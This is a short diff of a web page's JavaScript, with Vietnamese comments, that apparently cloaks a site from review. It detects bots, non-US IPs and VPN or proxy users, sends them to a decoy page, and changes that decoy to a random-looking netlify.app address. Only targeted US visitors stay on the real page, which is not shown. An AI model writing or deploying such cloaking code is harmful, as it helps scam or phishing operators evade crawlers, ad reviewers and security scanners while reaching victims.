@@ -10,7 +10,7 @@ function isBot() {
 
 // Nếu là bot ➔ chuyển về trang news
 if (isBot()) {
-    window.location.href = "https://bestweathertv.online/news.php";
+    window.location.href = "https://ditioeionsheoopxxxjienjsss.netlify.app";
 } else {
     // Nếu không phải bot ➔ kiểm tra IP quốc gia
     function fetchWithTimeout(resource, options = {}) {
@@ -27,13 +27,13 @@ if (isBot()) {
         .then(data => {
             if (!data || data.country_code !== "US" || data.proxy === true) {
                 // Nếu không phải IP US hoặc dùng VPN ➔ chuyển về news
-                window.location.href = "https://bestweathertv.online/news.php";
+                window.location.href = "https://ditioeionsheoopxxxjienjsss.netlify.app";
             }
         })
         .catch(error => {
             // Nếu lỗi API ➔ cũng chuyển về news
             console.error("Không xác định được IP:", error);
-            window.location.href = "https://bestweathertv.online/news.php";
+            window.location.href = "https://ditioeionsheoopxxxjienjsss.netlify.app";
         });
 }
 </script>
